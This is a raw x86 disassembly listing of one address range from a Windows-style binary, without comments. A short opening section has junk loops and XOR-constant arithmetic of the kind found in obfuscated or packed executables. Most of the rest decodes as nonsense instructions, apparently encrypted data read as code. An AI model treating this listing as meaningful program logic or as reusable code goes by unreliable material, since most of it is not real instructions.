  402949:	add    al,0x2b
  40294b:	shl    BYTE PTR [eax-0x8],1
  40294e:	mov    edi,0xcca61ed6
  402953:	mov    edi,0x52dbde6d
  402958:	pushf  
  402959:	aad    0x67
  40295b:	cmp    DWORD PTR [ecx],0xb9f5edc5
  402961:	xor    eax,0xde3e5ebe
  402966:	call   FWORD PTR [esi-0x37]
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x314d347c
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x7b70707e
  402afd:	shl    DWORD PTR [esi+ecx*8+0x17723b62],1
  402b04:	mov    bh,0x82
  402b06:	hlt    
  402b07:	mov    edx,0x225f2f7e
  402b0c:	jb     0x402a9c
  402b0e:	lods   al,BYTE PTR ds:[esi]
  402b0f:	cmp    BYTE PTR [ecx+0x41],cl
  402b12:	pop    es
  402b13:	push   esi
  402b14:	mov    bh,0x17
  402b16:	jo     0x402b1f
  402b18:	ret    0xaac
  402b1b:	(bad)  
  402b1c:	nop
  402b1d:	mov    bh,BYTE PTR [ebx]
  402b1f:	sbb    BYTE PTR [edx],ah
  402b21:	rcl    BYTE PTR [edx+0x5d],1
  402b24:	inc    esp
  402b25:	lods   eax,DWORD PTR ds:[esi]
  402b26:	retf   0xe593
  402b29:	dec    ebx
  402b2a:	inc    esi
  402b2b:	xchg   BYTE PTR [ebp-0x21],dh
  402b2e:	add    BYTE PTR [edx+0xf],ch
  402b31:	mov    eax,ds:0x1badcdbd
  402b36:	sub    bh,BYTE PTR [ecx]
  402b38:	ins    BYTE PTR es:[edi],dx
  402b39:	or     ah,bl
  402b3b:	iret   
  402b3c:	mov    al,ds:0x6b9c9e5f
  402b41:	push   eax
  402b42:	(bad)  
  402b43:	dec    BYTE PTR [ecx+0x5c]
  402b46:	or     al,0x8c
  402b48:	lods   eax,DWORD PTR ds:[esi]
  402b49:	outs   dx,BYTE PTR ds:[esi]
  402b4a:	cmp    ch,BYTE PTR [ecx+0x3c2ba288]
  402b50:	ret    0x3c9b
  402b53:	test   BYTE PTR [ecx+0x61],al
  402b56:	pop    es
  402b57:	add    ch,ah
  402b59:	mov    ch,0xbe
  402b5b:	(bad)  
  402b5c:	pushf  
  402b5d:	out    0xa0,al
  402b5f:	int3   
  402b60:	xchg   ebp,eax
  402b61:	dec    eax
  402b62:	pop    edi
  402b63:	loopne 0x402b24
  402b65:	mov    ds:0xa59b9ef0,al
  402b6a:	lods   al,BYTE PTR ds:[esi]
  402b6b:	std    
  402b6c:	jo     0x55234d49
  402b72:	or     cl,BYTE PTR ds:0x181191b2
  402b78:	rcl    DWORD PTR [esi+ebx*1-0x11eba0df],0x56
  402b80:	es pop esi
  402b82:	push   ecx
  402b83:	mov    cl,0xf0
  402b85:	push   eax
  402b86:	mov    dh,0x28
  402b88:	out    0xe9,al
  402b8a:	nop
  402b8b:	push   ss
  402b8c:	adc    al,0xdb
  402b8e:	xchg   edi,eax
  402b8f:	mov    dl,BYTE PTR [ebx]
  402b91:	aam    0x4a
  402b93:	pop    ss
  402b94:	mov    dh,0xfc
  402b96:	jecxz  0x402c0f
  402b98:	inc    edx
  402b99:	les    edi,FWORD PTR [ebx+0x48]
  402b9c:	sub    al,ch
  402b9e:	aad    0x5c
  402ba0:	in     al,dx
  402ba1:	test   al,0xe0
  402ba3:	aas    
  402ba4:	fs in  al,dx
  402ba6:	add    eax,0xfc0c82c0
  402bab:	ss inc edi
  402bad:	inc    ebx
  402bae:	fisub  DWORD PTR [eax+edx*4-0x57840b96]
  402bb5:	fbld   TBYTE PTR [eax+0x4a]
  402bb8:	mov    edi,0xc0aaaaf5
  402bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bbe:	lahf   
  402bbf:	cmp    edx,ebp
  402bc1:	setb   BYTE PTR [eax+0x6b09fc3f]
  402bc8:	xchg   edi,eax
  402bc9:	add    al,0x27
  402bcb:	(bad)  
  402bcc:	mov    ch,0xcc
  402bce:	mov    al,ds:0xeb956208
  402bd3:	jnp    0x402b74
  402bd5:	mov    bh,0xad
  402bd7:	add    BYTE PTR [esi-0xddef462],dl
  402bdd:	cld    
  402bde:	cld    
  402bdf:	fmul   QWORD PTR [edx-0x6479454f]
  402be5:	mov    eax,0xacedbef7
  402bea:	int3   
  402beb:	adc    BYTE PTR [edx+0x58],0xb4
  402bef:	and    al,0xfc
  402bf1:	or     DWORD PTR [ecx+0x5608dc12],eax
  402bf7:	pusha  
  402bf8:	into   
  402bf9:	push   esi
  402bfa:	iret   
  402bfb:	push   ebx
  402bfc:	xlat   BYTE PTR ds:[ebx]
  402bfd:	sub    ah,BYTE PTR [esp+ebx*8]
  402c00:	test   eax,0x6f2bd59a
  402c05:	sbb    bh,BYTE PTR ds:0x993c6b7a
  402c0b:	hlt    
  402c0c:	pop    ecx
  402c0d:	jl     0x402c02
  402c0f:	fsub   DWORD PTR [ecx+0x33f1757b]
  402c15:	test   al,0xd1
  402c17:	push   esp
  402c18:	into   
  402c19:	xchg   ebp,eax
  402c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c1b:	dec    esi
  402c1c:	das    
  402c1d:	sub    eax,0x87213c53
  402c22:	dec    eax
  402c23:	add    ah,BYTE PTR [ebp+0x4e]
  402c26:	jo     0x402c72
  402c28:	fst    DWORD PTR [eax+0x30]
  402c2b:	rcl    BYTE PTR [ebx],1
  402c2d:	jmp    0x14e:0x46830ec0
  402c34:	(bad)  
  402c35:	jp     0x402c85
  402c37:	ds popf 
  402c39:	je     0x402c02
  402c3b:	mov    ds:0xc17714e9,al
  402c40:	sub    al,0x19
  402c42:	pop    ebx
  402c43:	and    esp,DWORD PTR [esi]
  402c45:	scas   eax,DWORD PTR es:[edi]
  402c46:	and    esi,DWORD PTR [edx]
  402c48:	loopne 0x402be0
  402c4a:	jb     0x402bef
  402c4c:	mov    ecx,0x6132440d
  402c51:	cmp    edi,DWORD PTR [ebx-0x10]
  402c54:	shl    DWORD PTR [eax-0x7f837c6f],1
  402c5a:	cmp    ch,bl
  402c5c:	out    0x98,al
  402c5e:	sbb    ebx,eax
  402c60:	cmp    al,BYTE PTR [esi+0x78]
  402c63:	ja     0x402c8e
  402c65:	inc    ebx
  402c66:	pop    esi
  402c67:	xor    DWORD PTR [eax],0xffffffd3
  402c6a:	push   ebp
  402c6b:	cli    
  402c6c:	cwde   
  402c6d:	or     eax,0x960a25f1
  402c72:	je     0x402c6d
  402c74:	adc    al,0xe3
  402c76:	jmp    0xe9d2:0x2d92d092
  402c7d:	retf   0xd832
  402c80:	cmp    eax,0xf174bd1b
  402c85:	sbb    al,0x7b
  402c87:	xchg   DWORD PTR [esi],eax
  402c89:	repz push esi
  402c8b:	xchg   ecx,eax
  402c8c:	pop    ebx
  402c8d:	sub    ch,BYTE PTR [ebp+0x21]
  402c90:	jne    0x402c4c
  402c92:	stos   BYTE PTR es:[edi],al
  402c93:	minps  xmm5,XMMWORD PTR [edi]
  402c96:	push   ebp
  402c97:	ss xchg esp,eax
  402c99:	mov    dh,0x9
  402c9b:	push   ebp
  402c9c:	jle    0x402cd9
  402c9e:	push   esp
  402c9f:	jmp    0x364f13da
  402ca4:	inc    edx
  402ca5:	pusha  
  402ca6:	push   esp
  402ca7:	xchg   edi,eax
  402ca8:	xchg   ebp,eax
  402ca9:	adc    DWORD PTR [esi+0x2],0x8dc41b2
  402cb0:	retf   
  402cb1:	faddp  st(1),st
  402cb3:	ds jg  0x402cd7
  402cb6:	mov    al,ds:0x3b42dec
  402cbb:	mov    esi,0x51926702
  402cc0:	cmp    dl,BYTE PTR [esi]
  402cc2:	mov    ds:0xdf13fb6a,al
  402cc7:	jno    0x402cb8
  402cc9:	xor    eax,0xffffffdf
  402ccc:	push   esp
  402ccd:	sar    dl,0x41
  402cd0:	imul   esi,DWORD PTR [edi-0xd],0xffffffbd
  402cd4:	dec    esp
  402cd5:	das    
  402cd6:	mov    bh,0x62
  402cd8:	retf   
  402cd9:	int3   
  402cda:	pop    edi
  402cdb:	push   ss
  402cdc:	mov    edx,0x3f81fa58
  402ce1:	pop    ds
  402ce2:	stc    
  402ce3:	nop
  402ce4:	aaa    
  402ce5:	pop    ds
  402ce6:	cmp    eax,0x37275e4f
  402ceb:	addr16 xchg ebp,eax
  402ced:	push   esi
  402cee:	jecxz  0x402ce6
  402cf0:	shl    cl,1
  402cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cf3:	xchg   edx,eax
  402cf4:	aam    0xcd
  402cf6:	popa   
  402cf7:	(bad)  
  402cf8:	repz jp 0x402cbb
  402cfb:	or     ecx,edi
  402cfd:	int3   
  402cfe:	pop    ebx
  402cff:	clc    
  402d00:	jnp    0x402ce8
  402d02:	push   cs
  402d03:	lea    ecx,[ecx]
  402d05:	ror    bl,1
  402d07:	jge    0x402d85
  402d09:	bound  ebp,QWORD PTR [eax-0x13]
  402d0c:	out    0x1d,eax
  402d0e:	add    al,0xac
  402d10:	jp     0x402c98
  402d12:	sbb    DWORD PTR [eax-0x57920727],edx
  402d18:	pop    edi
  402d19:	cmp    eax,0x82f7580d
  402d1e:	pop    esi
  402d1f:	sub    ecx,ebx
  402d21:	jbe    0x402cca
  402d23:	pop    edi
  402d24:	rol    BYTE PTR [edx],cl
  402d26:	jns    0x402d96
  402d28:	stos   DWORD PTR es:[edi],eax
  402d29:	xchg   BYTE PTR [eax+eiz*1],ah
  402d2c:	ss jl  0x402da6
  402d2f:	mov    ebp,eax
  402d31:	(bad)  
  402d32:	push   ebp
  402d33:	je     0x402d5e
  402d35:	nop
  402d36:	inc    ebp
  402d37:	xor    BYTE PTR [esp+eax*2],ah
  402d3a:	stc    
  402d3b:	fldenv [edx]
  402d3d:	and    BYTE PTR [ecx],al
  402d3f:	push   edx
  402d40:	test   BYTE PTR [edx+0x1ebd8ecf],dh
  402d46:	and    eax,0x5bed37b7
  402d4b:	push   esp
  402d4c:	fst    DWORD PTR [edi-0x48]
  402d4f:	sbb    DWORD PTR [edx+0x4dcb5c5c],0x1e
  402d56:	retf   
  402d57:	fstp   QWORD PTR [edx-0x29502891]
  402d5d:	(bad)  
  402d5e:	pop    ebx
  402d5f:	cli    
  402d60:	outs   dx,DWORD PTR ds:[esi]
  402d61:	jcxz   0x402db7
  402d64:	test   esi,ebp
  402d66:	popf   
  402d67:	mov    dh,0x57
  402d69:	cli    
  402d6a:	adc    ebx,ebp
  402d6c:	mov    ch,0x4d
  402d6e:	adc    DWORD PTR [ebx-0x3b0501f4],esp
  402d74:	clc    
  402d75:	fdivr  DWORD PTR [edi]
  402d77:	(bad)  
  402d78:	and    al,0xff
  402d7a:	mov    ds:0xc4a4e323,eax
  402d7f:	cmp    al,0xe1
  402d81:	push   edx
  402d82:	cld    
  402d83:	push   eax
  402d84:	push   ss
  402d85:	ja     0x402d27
  402d87:	aaa    
  402d88:	dec    edx
  402d89:	mov    ecx,0xc88fb391
  402d8e:	data16 add BYTE PTR [esi],0x22
  402d92:	mov    dh,0xf1
  402d94:	dec    esp
  402d95:	mov    dh,0x8a
  402d97:	popf   
  402d98:	push   ecx
  402d99:	arpl   WORD PTR [ebp-0x107c6b1a],sp
  402d9f:	cwde   
  402da0:	iret   
  402da1:	stos   BYTE PTR es:[edi],al
  402da2:	sub    al,0x6b
  402da4:	add    BYTE PTR [edi-0x73615a24],al
  402daa:	aad    0xf0
  402dac:	cmp    DWORD PTR [esi+ebp*2],eax
  402daf:	and    cl,BYTE PTR [ecx]
  402db1:	push   ebp
  402db2:	cmp    edx,edx
  402db4:	ja     0x402dc5
  402db6:	mov    dl,0x41
  402db8:	outs   dx,BYTE PTR ds:[esi]
  402db9:	push   cs
  402dba:	jge    0x402ddc
  402dbc:	adc    eax,DWORD PTR [ebx+eax*1-0x2a]
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	pop    eax
  402de0:	inc    esi
  402de1:	test   bh,bh
  402de3:	mov    esi,0xbe70700a
  402de8:	jle    0x402e5a
  402dea:	jo     0x402e40
  402dec:	pushf  
  402ded:	jmp    0x402dce
  402def:	mov    dl,0x14
  402df1:	sbb    ah,cl
  402df3:	bswap  edx
  402df5:	jl     0x402ddf
  402df7:	mov    bh,0xf3
  402df9:	sbb    eax,DWORD PTR [esi+0x5f]
  402dfc:	xchg   esp,eax
  402dfd:	adc    eax,0x6e0e45ff
  402e02:	pop    ss
  402e03:	or     eax,0xb5031da1
  402e08:	or     DWORD PTR [edx+0x5fb4f318],edx
  402e0e:	test   dl,cl
  402e10:	stc    
  402e11:	rcl    DWORD PTR [esp+edi*4],cl
  402e14:	neg    BYTE PTR [edi+0x60]
  402e17:	test   al,0xb6
  402e19:	cdq    
  402e1a:	mov    ss,WORD PTR [edx]
  402e1c:	sbb    bl,dh
  402e1e:	std    
  402e1f:	sbb    eax,0xa466c304
  402e24:	sub    al,0xba
  402e26:	add    eax,0x4c9fb6
  402e2b:	push   ebp
  402e2c:	les    ecx,FWORD PTR [esi+0x8b1c130]
  402e32:	imul   ebx,DWORD PTR fs:[eax-0x42909f32],0xe56e6043
  402e3d:	cmc    
  402e3e:	mov    edx,0x1b35fe59
  402e43:	mov    DWORD PTR [ebx],eax
  402e45:	icebp  
  402e46:	out    dx,eax
  402e47:	mov    dh,0x9a
  402e49:	adc    DWORD PTR [edx-0x65],0x33
  402e4d:	sub    BYTE PTR [ecx+0x51],0x11
  402e51:	ret    
  402e52:	mov    edi,0x2e8f53d7
  402e57:	mov    ecx,0x65066783
  402e5c:	inc    edx
  402e5d:	xor    al,0x9a
  402e5f:	cwde   
  402e60:	xchg   BYTE PTR [ebx-0x3f],bh
  402e63:	(bad)  
  402e64:	fist   DWORD PTR [eax-0x298c1bd]
  402e6a:	fcom   DWORD PTR [eax+0x44]
  402e6d:	dec    esi
  402e6e:	call   0xad7a0e72
  402e73:	inc    esp
  402e74:	bound  esi,QWORD PTR [ecx-0x40]
  402e77:	jb     0x402e10
  402e79:	mov    esp,0x83ea5818
  402e7e:	out    0x12,eax
  402e80:	adc    eax,0x204067aa
  402e85:	fcom   DWORD PTR [ebx-0x736fcc34]
  402e8b:	push   0x43a694b
  402e90:	sbb    eax,0x73ae6eef
  402e95:	leave  
  402e96:	repz dec edi
  402e98:	in     eax,0x5
  402e9a:	sbb    ebx,DWORD PTR [edx+0x4cde7814]
  402ea0:	dec    ebx
  402ea1:	faddp  st(7),st
  402ea3:	dec    eax
  402ea4:	lods   eax,DWORD PTR ds:[esi]
  402ea5:	inc    esp
  402ea6:	push   cs
  402ea7:	push   ecx
  402ea8:	pop    esp
  402ea9:	stos   BYTE PTR es:[edi],al
  402eaa:	ins    BYTE PTR es:[edi],dx
  402eab:	jmp    ebx
  402ead:	stos   BYTE PTR es:[edi],al
  402eae:	popf   
  402eaf:	jg     0x402e57
  402eb1:	in     al,0x7c
  402eb3:	stc    
  402eb4:	scas   eax,DWORD PTR es:[edi]
  402eb5:	mov    al,ds:0xfefcd6d3
  402eba:	cmc    
  402ebb:	rcl    al,1
  402ebd:	out    dx,eax
  402ebe:	sbb    al,0x80
  402ec0:	pop    ebp
  402ec1:	mov    DWORD PTR [ecx+ebp*2-0x39bf9830],ecx
  402ec8:	lahf   
  402ec9:	mov    ebp,0x42c65579
  402ece:	or     DWORD PTR [ecx+0x79],0xffffffce
  402ed2:	xchg   edi,eax
  402ed3:	lods   eax,DWORD PTR ds:[esi]
  402ed4:	rcl    al,cl
  402ed6:	shr    DWORD PTR [ebp+0x49],1
  402ed9:	xchg   esi,eax
  402eda:	or     al,0x5d
  402edc:	aam    0xd0
  402ede:	jp     0x402ef0
  402ee0:	mov    al,ds:0x943816dc
  402ee5:	loop   0x402edb
  402ee7:	dec    ecx
  402ee8:	mov    ch,0xd0
  402eea:	sub    sp,WORD PTR [edi+0x27]
  402eee:	pop    esp
  402eef:	cli    
  402ef0:	aaa    
  402ef1:	xor    eax,DWORD PTR es:[ebp-0x1d]
  402ef5:	js     0x402eeb
  402ef7:	and    bl,dl
  402ef9:	mov    ah,0x6b
  402efb:	mov    eax,ds:0x3063ac3d
  402f00:	daa    
  402f01:	jp     0x402ecc
  402f03:	dec    ecx
  402f04:	nop
  402f05:	retf   0x99bb
  402f08:	mov    ebx,0xa86113ff
  402f0d:	fcmovnu st,st(6)
  402f0f:	dec    DWORD PTR [eax+ecx*8+0x3e]
  402f13:	vaddps xmm5,xmm4,XMMWORD PTR [ecx]
  402f17:	std    
  402f18:	ins    BYTE PTR es:[edi],dx
  402f19:	xlat   BYTE PTR ds:[ebx]
  402f1a:	push   ds
  402f1b:	lods   al,BYTE PTR ds:[esi]
  402f1c:	xchg   esp,eax
  402f1d:	dec    ebx
  402f1e:	adc    ecx,DWORD PTR [esi+0x19]
  402f21:	cli    
  402f22:	loopne 0x402efb
  402f24:	loop   0x402f76
  402f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f27:	ret    
  402f28:	fidivr DWORD PTR [eax+0x780a3104]
  402f2e:	pop    edi
  402f2f:	stos   BYTE PTR es:[edi],al
  402f30:	mov    ebp,DWORD PTR [edi-0x74a2bfc7]
  402f36:	test   DWORD PTR [edx-0x31],ecx
  402f39:	(bad)  
  402f3b:	pop    edx
  402f3c:	ret    0xc355
  402f3f:	sar    al,cl
  402f41:	test   eax,eax
  402f43:	cmc    
  402f44:	fistp  QWORD PTR [edx-0x399308c2]
  402f4a:	shr    BYTE PTR [eax+eiz*8],1
  402f4d:	pop    ds
  402f4e:	mov    esi,0xc361ab4b
  402f53:	ror    BYTE PTR [eax+0x7650f1c4],0x4c
  402f5a:	aad    0xaf
  402f5c:	dec    esi
  402f5d:	std    
  402f5e:	mov    ah,0xc9
  402f60:	(bad)  
  402f61:	jmp    0x1e9e4479
  402f66:	sub    bl,BYTE PTR [esi-0xf]
  402f69:	mov    ecx,0x80a0af18
  402f6e:	dec    edx
  402f6f:	ret    0x250c
  402f72:	pop    ecx
  402f73:	and    al,BYTE PTR [edi-0x46]
  402f76:	fcom   QWORD PTR [ebx-0x50]
  402f79:	test   al,0xfe
  402f7b:	push   esp
  402f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f7d:	xchg   ebx,eax
  402f7e:	gs jmp 0x402f46
  402f81:	cmp    eax,0x4ed8ba82
  402f86:	push   ds
  402f87:	jb     0x402f84
  402f89:	or     eax,0xa50190c1
  402f8e:	rcr    ah,1
  402f90:	adc    BYTE PTR [ecx],al
  402f92:	xchg   BYTE PTR [ecx],bh
  402f94:	jnp    0x402f67
  402f96:	jno    0x402f21
  402f98:	test   al,0x59
  402f9a:	mov    edx,0x34588ba0
  402f9f:	pusha  
  402fa0:	dec    edx
  402fa1:	shl    DWORD PTR [ebx-0x4c59b5ae],cl
  402fa7:	xchg   esi,eax
  402fa8:	jnp    0x402fb7
  402faa:	adc    eax,0x4be15f36
  402faf:	in     al,dx
  402fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fb1:	lods   al,BYTE PTR ds:[esi]
  402fb2:	push   ss
  402fb3:	repz scas eax,DWORD PTR es:[edi]
  402fb5:	xchg   edi,eax
  402fb6:	push   edx
  402fb7:	inc    ecx
  402fb8:	adc    ecx,DWORD PTR ds:0x4bbf2689
  402fbe:	sub    eax,0x29ea1916
  402fc3:	fbld   TBYTE PTR [ebp+0x56]
  402fc6:	clc    
  402fc7:	dec    ebx
  402fc8:	pop    esp
  402fc9:	imul   esi,DWORD PTR [esi-0x16],0xabe8782e
  402fd0:	adc    dh,BYTE PTR [ecx]
  402fd2:	mov    dl,0x6a
  402fd4:	add    eax,0xbb9eae6f
  402fd9:	ja     0x402ffc
  402fdb:	sti    
  402fdc:	sbb    ecx,DWORD PTR [ecx+ebx*2]
  402fdf:	push   esp
  402fe0:	lock push 0xffffffe2
  402fe3:	int    0xe4
  402fe5:	sbb    edx,DWORD PTR ds:0x25451c93
  402feb:	ja     0x402fa4
  402fed:	adc    eax,0xa13d427
  402ff2:	ss daa 
  402ff4:	sar    BYTE PTR es:0x6c2e0a93,1
  402ffb:	lods   al,BYTE PTR ds:[esi]
  402ffc:	(bad)  
  402ffd:	fcomp  DWORD PTR [ecx+ebx*8]
  403000:	mov    esi,0x133212ff
  403005:	sbb    edi,DWORD PTR [edi]
  403007:	loop   0x402fe5
  403009:	mov    eax,0x2e9f522e
  40300e:	jmp    0x1248eca0
  403013:	jle    0x402fa0
  403015:	adc    BYTE PTR [ecx-0x1d],dl
  403018:	rcl    BYTE PTR [edx+0x65da38b0],cl
  40301e:	jo     0x402ffe
  403020:	inc    edx
  403021:	mov    WORD PTR [ebp-0x58],cs
  403024:	hlt    
  403025:	push   edi
  403026:	std    
  403027:	(bad)  [eax]
  403029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40302a:	gs inc edi
  40302c:	xchg   edi,eax
  40302d:	push   ebx
  40302e:	pop    edx
  40302f:	arpl   dx,cx
  403031:	mov    ebp,0xe742df0e
  403036:	or     ebp,DWORD PTR [edi+0x4aef0770]
  40303c:	in     al,0x8c
  40303e:	and    ecx,DWORD PTR [edi]
  403040:	es push ebp
  403042:	xchg   DWORD PTR [esi],ebx
  403044:	fnsave [edx]
  403046:	retf   0x1a8
  403049:	aad    0xfc
  40304b:	mov    ch,0xcc
  40304d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40304e:	jne    0x40308b
  403050:	mov    edi,0xef99f9d5
  403055:	dec    edi
  403056:	(bad)  
  403057:	sub    BYTE PTR [ebx+0x6dced233],ah
  40305d:	pop    ebp
  40305e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40305f:	xchg   esp,eax
  403060:	xor    al,BYTE PTR [eax+0x21]
  403063:	jb     0x403092
  403065:	pop    ebp
  403066:	sbb    al,0xc3
  403068:	mov    al,ds:0x73e10859
  40306d:	and    al,0xee
  40306f:	shl    esi,cl
  403071:	jl     0x4030cc
  403073:	out    0x17,al
  403075:	dec    esp
  403076:	pushf  
  403077:	lahf   
  403078:	arpl   dx,di
  40307a:	add    eax,0x1004ad93
  40307f:	dec    ebx
  403080:	push   eax
  403081:	mov    ebx,DWORD PTR [ecx]
  403083:	dec    ax
  403085:	pop    edx
  403086:	mov    esi,0xa47d51ca
  40308b:	daa    
  40308c:	ss jle 0x40302e
  40308f:	inc    ecx
  403090:	jmp    0x308bc641
  403095:	push   edi
  403096:	lahf   
  403097:	or     cl,ah
  403099:	inc    esi
  40309b:	daa    
  40309c:	jmp    0xe189:0x66fcadae
  4030a3:	push   esi
  4030a4:	loop   0x40309e
  4030a6:	add    dl,BYTE PTR [ecx+0x41795a6]
  4030ac:	dec    ecx
  4030ad:	mov    esi,0x32729c
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xd0
  4030ce:	push   eax
  4030cf:	or     edi,edi
  4030d1:	cld    
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0xc370707e
  4030da:	shl    edi,0x3c
  4030dd:	inc    edi
  4030de:	data16 aaa 
  4030e0:	rcl    dl,0x1c
  4030e3:	inc    edx
  4030e4:	out    dx,al
  4030e5:	cld    
  4030e6:	push   ds
  4030e7:	scas   al,BYTE PTR es:[edi]
  4030e8:	pop    ds
  4030e9:	adc    bl,dh
  4030eb:	mov    WORD PTR [ecx-0x5eed53a9],gs
  4030f1:	imul   edi,DWORD PTR [esi],0xcf84bc9c
  4030f7:	mov    esi,0xcc1191d9
  4030fc:	xor    eax,DWORD PTR [edx]
  4030fe:	adc    ebx,DWORD PTR [eax-0x2f]
  403101:	or     BYTE PTR [ebx-0x3ae1a0be],0xa6
  403108:	xchg   BYTE PTR [esi],cl
  40310a:	sbb    dh,BYTE PTR [esp+eax*4+0x3c26e786]
  403111:	and    ah,BYTE PTR [edi-0x3dda15cf]
  403117:	push   ebx
  403118:	imul   edx,DWORD PTR [ecx-0x1b260a5],0x5dac4d03
  403122:	xor    BYTE PTR ss:[eax+edi*8],al
  403126:	int    0x75
  403128:	enter  0x30c9,0x4f
  40312c:	pop    eax
  40312d:	or     BYTE PTR [ebx-0x78],bl
  403130:	rcl    DWORD PTR [esi],1
  403132:	xchg   ebx,eax
  403133:	fs fs mov ebp,0xf91d6b21
  40313a:	push   0xfffffff3
  40313c:	xchg   ebp,eax
  40313d:	icebp  
  40313e:	adc    ch,BYTE PTR [esi+edx*8]
  403141:	pop    edx
  403142:	into   
  403143:	shl    BYTE PTR [ecx-0x4751f95b],0xb6
  40314a:	jmp    FWORD PTR [esi]
  40314c:	loope  0x403153
  40314e:	push   edi
  40314f:	jp     0x40310d
  403151:	sbb    eax,0xf6076f3c
  403156:	dec    esp
  403157:	mov    cl,0x18
  403159:	ror    DWORD PTR [ebx-0x7524511d],cl
  40315f:	or     al,0xab
  403161:	(bad)  
  403162:	inc    DWORD PTR [esp+esi*4+0x3088a3ef]
  403169:	add    BYTE PTR [ebx+eiz*4+0x7832956],ch
  403170:	pop    edx
  403171:	test   BYTE PTR [ebx+0x41],dh
  403174:	jg     0x403130
  403176:	adc    ch,bh
  403178:	mov    bh,0x20
  40317a:	or     al,0x4e
  40317c:	popf   
  40317d:	(bad)  
  40317e:	mov    ecx,0xf2df0644
  403183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403184:	mov    DWORD PTR [esi+ebx*1-0x6d95e357],esi
  40318b:	popf   
  40318c:	or     BYTE PTR [ebx-0x4],0x2a
